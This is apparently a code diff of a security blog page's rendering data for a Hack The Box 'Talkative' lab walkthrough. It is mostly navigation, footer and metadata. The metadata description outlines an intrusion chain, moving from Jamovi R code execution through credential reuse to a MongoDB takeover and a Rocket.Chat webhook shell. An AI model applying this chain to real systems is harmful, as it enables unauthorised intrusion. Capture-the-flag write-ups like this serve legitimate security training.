-16:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-sink-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Sink Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-tenet-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Tenet Walkthrough"}]]}]}]]}]
-17:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-1b:T531,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/#article","headline":"Hack The Box: Talkative Walkthrough","description":"An archived walkthrough of the retired Hack The Box Talkative machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/","datePublished":"2026-06-11T11:10:29.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3976,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3395c117483486553dea92267f83d4f0e9a2bec1/HTB-Talkative.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-talkative-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Talkative Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/"}]}]}18:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1b"}}]
-19:["$","$L1c",null,{"children":["$","$1d",null,{"name":"Next.MetadataOutlet","children":"$@1e"}]}]
-1e:null
+<hr>
+<p><em>Walkthrough by: HTB Player | Machine: Talkative (Hard) | Platform: HackTheBox</em></p>16:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$1b"}}]
+17:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-sink-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Sink Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-tenet-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Tenet Walkthrough"}]]}]}]]}]
+18:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1c:T5ad,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/#article","headline":"Hack The Box: Talkative Walkthrough","description":"Unauthenticated Jamovi R execution exposed Bolt credentials, Bolt code execution and password reuse reached Saul on the host, then an unauthenticated MongoDB takeover enabled a Rocket.Chat webhook shell whose dangerous capability read the host's root flag.","url":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/","datePublished":"2026-06-11T11:10:29.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3879,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3395c117483486553dea92267f83d4f0e9a2bec1/HTB-Talkative.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-talkative-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Talkative Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-talkative-walkthrough/"}]}]}19:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1c"}}]
+1a:["$","$L1d",null,{"children":["$","$1e",null,{"name":"Next.MetadataOutlet","children":"$@1f"}]}]
+1f:null
